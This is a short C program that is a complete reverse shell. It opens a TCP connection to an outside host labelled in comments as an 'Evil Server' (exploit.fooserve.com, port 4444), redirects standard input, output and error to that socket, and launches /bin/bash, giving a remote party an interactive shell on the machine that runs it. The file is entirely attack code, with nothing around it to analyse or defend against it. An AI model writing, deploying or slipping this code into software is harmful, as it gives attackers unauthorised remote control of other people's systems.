#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// You have to use your own HOSTNAME and PORT
#define HOSTNAME "exploit.fooserve.com"
#define PORT 4444

#define MAXARRAY 150000

int main(int argc, char **argv)
{
    // Connect to Evil Server
    struct sockaddr_in servaddr;
    struct hostent *hp;
    int sock_id;
    char message[MAXARRAY];
    int msglen;
    sock_id = socket(AF_INET, SOCK_STREAM, 0);
    memset(&servaddr,0,sizeof(servaddr));
    hp = gethostbyname(HOSTNAME);
    memcpy((char *)&servaddr.sin_addr.s_addr, (char *)hp->h_addr, hp->h_length);
    servaddr.sin_port = htons(PORT);
    servaddr.sin_family = AF_INET;
    connect(sock_id, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // Descriptors to Socket
    // setsid();
    dup2( sock_id, 0 );
    dup2( sock_id, 1 );
    dup2( sock_id, 2 );

    // Execute Shell
    execl( "/bin/bash", "/bin/cat", NULL );
   
    // Close Handler 
    close( sock_id );
     
    return 0;
}
